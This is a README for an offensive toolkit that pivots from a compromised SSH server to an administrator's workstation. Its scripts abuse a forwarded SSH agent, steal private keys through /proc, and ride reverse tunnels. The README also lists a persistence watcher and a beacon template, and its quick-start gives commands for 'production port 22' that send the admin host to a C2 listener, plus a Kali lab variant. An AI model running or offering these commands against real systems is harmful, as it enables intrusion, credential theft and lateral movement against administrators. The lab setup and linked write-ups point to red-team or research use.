# ssh-infected-admin-pivot

Pivot from **compromised SSH server** to **admin workstation** after they connect (see [WRITEUP-admin-ssh-infected-machine.md](../WRITEUP-admin-ssh-infected-machine.md)).

Trap that forces `ssh -A`: [ssh-agent-forward-trap/](../ssh-agent-forward-trap/) + [WRITEUP-ssh-agent-forward-trap.md](../WRITEUP-ssh-agent-forward-trap.md).

## Scripts

| Script | When |
|--------|------|
| `lib.sh` | Shared helpers (sourced, not run) |
| `pivot_agent_to_admin.sh` | Admin used **`ssh -A`** |
| `pivot_proc_root_key.sh` | **`ssh -i`** only, client on same host (`/proc/PID/root`) |
| `pivot_infected_admin.sh` | Try agent, then proc key |
| `pivot_via_remote_forward.sh` | Admin opened **`ssh -R`** tunnel |
| `watch_ssh_client_pivot.sh` | Persistence: new ssh client → pivot |
| `post_pivot_admin_host.sh` | Run `remote_on_admin_host.sh` on admin PC |
| `post_pivot_via_agent.sh` | Agent + post in one step |
| `remote_on_admin_host.sh` | **Runs on admin host** (beacon template) |

## Quick start (production port 22)

```bash
chmod +x *.sh
export SSH_SERVER_PORT=22 VICTIM_USER=legacy ADMIN_USER=admin

sudo ./pivot_agent_to_admin.sh <ADMIN_IP>
# or full chain + beacon:
C2_HOST=http://YOUR_LISTENER:8080 sudo ./post_pivot_via_agent.sh <ADMIN_IP>
```

## Kali lab (port 2221)

```bash
export SSH_SERVER_PORT=2221
sudo ./pivot_agent_to_admin.sh 172.17.0.2 2221
```

## Environment

`SSH_SERVER_PORT`, `ADMIN_SSH_PORT`, `VICTIM_USER`, `ADMIN_USER`, `REMOTE_CMD`, `OUT_KEY`, `KEY`, `C2_HOST`, `PAYLOAD_NAME`, `LOOT_DIR`, `INTERVAL`, `STATE_FILE`, `WATCH_LOG`